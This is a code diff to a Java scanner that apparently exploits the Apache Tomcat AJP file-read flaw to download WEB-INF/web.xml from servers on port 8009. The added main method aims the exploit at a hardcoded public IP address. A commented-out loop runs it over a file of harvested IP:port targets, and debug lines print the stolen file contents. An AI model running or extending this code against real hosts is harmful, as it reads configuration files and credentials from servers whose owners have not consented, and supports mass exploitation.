@@ -41,7 +41,7 @@ public class GBWScanAJPScript implements GBWScanScript {
         request.addAttr("req_attribute","javax.servlet.include.servlet_path,/");
 
         request.setIs_ssl(config.isSSL());
-
+        request.setData_direction(GBWAJPConstants.SERVER_TO_CONTAINER);
         return request.createMessage(4096);
     }
 
@@ -59,14 +59,50 @@ public class GBWScanAJPScript implements GBWScanScript {
             if(data!=null&&data.length>0){
 
                 log.warn(String.format("Find a apache tomcat ajp any file download poc in:%s:%d",host.getServer(),host.getPort()));
+                //System.out.println(String.format("Find a apache tomcat ajp any file download poc in:%s:%d",host.getServer(),host.getPort()));
                 sinkQueue.put(new GBWScanAJPResult(config,host,data));
+
+                //System.out.println(new String(data));
             }
         }catch (Exception e){
-
+            e.printStackTrace();
         }finally {
 
             if(client!=null)
                 client.close();
         }
     }
+
+
+
+    public static void main(String[] args)  {
+
+        GBWScanAJPConfig config = new GBWScanAJPConfig();
+        config.setFile("WEB-INF/web.xml");
+        config.setFilePrefix("web.xml");
+        config.setStoreDir("D:\\shajf_dev\\GBWScanner\\target");
+        config.setSSL(false);
+        config.setConTimeout(10000);
+        config.setReadTimeout(10000);
+        config.setUri("/");
+        config.setMaxLen(8192);
+        GBWScanAJPScript scanAJPScript = new GBWScanAJPScript(config);
+
+/*
+        for (String line:Files.readAllLines(Paths.get("D:\\shajf_dev\\GBWScanner\\target\\8009.data"))){
+
+            String[] ips = line.split(":");
+
+            Host host = new Host(ips[0],ips[0],Integer.parseInt(ips[1]),null,"tcp");
+
+            System.out.println("start:"+host.getHost());
+
+            scanAJPScript.scan(host,null);
+        }*/
+
+
+        Host host = new Host("69.89.15.79","69.89.15.79",8009,null,"tcp");
+        scanAJPScript.scan(host,null);
+    }
+
 }
